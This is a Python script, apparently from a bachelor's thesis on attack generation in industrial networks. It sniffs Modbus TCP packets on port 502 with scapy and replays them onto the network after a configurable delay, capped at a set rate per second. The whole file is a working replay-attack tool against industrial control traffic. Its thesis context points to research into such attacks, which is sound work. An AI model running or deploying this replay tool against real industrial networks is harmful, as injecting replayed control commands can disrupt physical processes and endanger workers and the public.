# Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
# File name: replay.py
# Authors: Jakub Kuzník <xkuzni04>
# institution: VUT FIT 
# Description: sniff modbus packets and send then with some delay 
# execution: replay.py max/p/s delay 
#   max/p/s == max replay packets in seconds
#   delay   == waiting in ms to send sniffed packet  

# python3 replay.py 5 2000  ==== replay 5 packets in second with 2000milisecond delay 

from scapy.all import *
import sys
import threading



# Define the network interfaces to listen on and forward packets to
listen_interface = "eno2"

DELAY=0
MAX_IN_S=0

prev_sec = int(time.time())
counter=0

# Define the function that will be called for each received packet
def handle_packet(packet):

    global prev_sec, counter, MAX_IN_S

    # filter only modbus packet (tcp && (dst.port == 502 || src.port == 502 ))
    if not (packet.haslayer(TCP) and (packet[TCP].sport == 502 or packet[TCP].dport == 502)):
        return
    
    current_sec = int(time.time())
    # reset counter each second 
    if current_sec != prev_sec: 
        counter = 0
    
    # record time 
    prev_sec = int(time.time())

    ## max/p/s limit 
    if counter >= MAX_IN_S:
        return

    # Create a new thread
    t = threading.Thread(target=sendPacketInThread, args=(packet,))
    t.start() # Start the thread
    counter += 1

# i want to send packet in thread so it doesn't block anything else 
def sendPacketInThread(packet):
    ## wait DELAY miliseconds before sending replay packet 
    time.sleep(DELAY / 1000)
    print(packet)
    sendp(packet, iface=listen_interface)




def parse_args():
    global MAX_IN_S, DELAY
    MAX_IN_S = int(sys.argv[1])
    DELAY    = int(sys.argv[2])


print(sys.argv[1], sys.argv[2])
parse_args()

# Start sniffing packets on the listen interface and call the handle_packet function for each packet received
sniff(iface=listen_interface, prn=handle_packet)